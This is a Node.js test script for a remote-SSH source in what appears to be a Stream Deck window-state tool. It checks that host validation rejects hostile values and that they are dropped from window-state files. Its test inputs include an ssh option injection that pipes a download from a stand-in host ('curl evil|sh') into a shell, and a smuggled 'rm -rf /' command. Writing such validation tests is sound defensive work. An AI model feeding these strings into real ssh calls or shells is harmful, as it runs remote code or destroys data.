// Verifies the remote-SSH source: host validation, the two fetch framings,
// and that a remote source produces byte-identical sessions to a local one.
// Run: node scripts/remote-check.mjs
import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { readWindowStates, validHost } from "../src/window-state.mjs";

// --- validHost ------------------------------------------------------------
assert.equal(validHost("192.168.2.6"), "192.168.2.6", "a plain host passes");
assert.equal(validHost("pi@192.168.2.6"), "pi@192.168.2.6", "user@host passes");
assert.equal(validHost("beast.local"), "beast.local", "a dotted name passes");
// A leading dash is an ssh *option*, not a host: `-oProxyCommand=...` would
// run locally. execFile does not help — the parsing is ssh's own.
assert.equal(validHost("-oProxyCommand=curl evil|sh"), null, "a leading dash is rejected");
assert.equal(validHost("host; rm -rf /"), null, "shell metacharacters are rejected");
assert.equal(validHost("host name"), null, "a space is rejected");
assert.equal(validHost(""), null, "empty is rejected");
assert.equal(validHost(undefined), null, "absent is null, not a throw");
assert.equal(validHost(42), null, "a non-string is null, not a throw");

// --- readWindowStates carries host ---------------------------------------
const dir = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(
  join(dir, `${process.pid}.json`),
  JSON.stringify({ folders: ["/home/pi/x"], focused: false, activeSessionId: null, host: "192.168.2.6" })
);
const [win] = readWindowStates(dir);
assert.equal(win.host, "192.168.2.6", "a published host is returned");

const dir2 = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(
  join(dir2, `${process.pid}.json`),
  JSON.stringify({ folders: ["/x"], focused: false, activeSessionId: null, host: "-oProxyCommand=x" })
);
assert.equal(readWindowStates(dir2)[0].host, null, "a hostile host is dropped, the window is kept");

const dir3 = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(join(dir3, `${process.pid}.json`), JSON.stringify({ folders: ["/x"], focused: true }));
assert.equal(readWindowStates(dir3)[0].host, null, "a window with no host reads null, not undefined");

console.log("remote-check: OK");
